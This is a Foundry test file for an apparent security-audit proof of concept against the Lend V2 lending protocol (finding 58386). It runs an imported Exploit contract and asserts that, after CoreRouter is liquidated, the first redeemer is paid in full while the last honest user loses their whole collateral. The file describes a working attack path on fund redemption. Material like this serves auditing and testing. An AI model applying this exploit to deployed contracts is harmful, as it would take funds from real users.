// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import {Exploit, CoreRouter, LToken, LendStorage, MockToken, User} from "./58386-lend-liquidating-corerouter-can-cause-excess-borrower-loss.sol";

// Lend V2 H-17 (finding 58386): CoreRouter.redeem() pays out `_amount *
// exchangeRate / 1e18`, never checking CoreRouter's actual remaining collateral
// in the LToken. Once CoreRouter is liquidated in that market, the first
// redeemer is paid in full and the last redeemer is stranded, losing everything.
contract Finding58386Test is Test {
    function test_exploit_liquidatedCoreRouter_strandsLastRedeemer() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("first redeemer received", e.firstRedeemerReceived());
        emit log_named_uint("honest user loss", e.honestLoss());
        emit log_named_uint("exploit profit", e.profit());

        assertEq(e.firstRedeemerReceived(), 1000e18, "first redeemer paid in full at stale rate");
        assertTrue(e.lastRedeemerFailed(), "last redeemer redeem() must revert");
        assertEq(e.honestLoss(), 1000e18, "honest last user loses their entire supplied collateral");
        assertEq(e.profit(), 1000e18, "exploit walks away with a full-value redemption");
    }
}
